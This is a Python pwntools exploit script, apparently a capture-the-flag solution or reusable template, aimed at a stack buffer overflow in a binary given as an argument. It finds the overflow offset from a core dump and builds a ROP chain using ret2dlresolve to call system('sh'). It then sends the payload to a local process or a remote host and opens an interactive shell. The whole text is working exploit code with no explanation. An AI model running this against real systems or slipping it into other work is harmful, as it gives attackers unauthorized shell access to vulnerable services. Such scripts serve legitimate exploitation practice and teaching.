#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF(args.BIN)

p = process(binary.path)
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8),n=8)
log.info('padding: ' + hex(padding))

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]
dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
	p = remote(args.HOST, args.PORT)
else:
	p = process(binary.path)

payload  = b''
payload += padding * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()
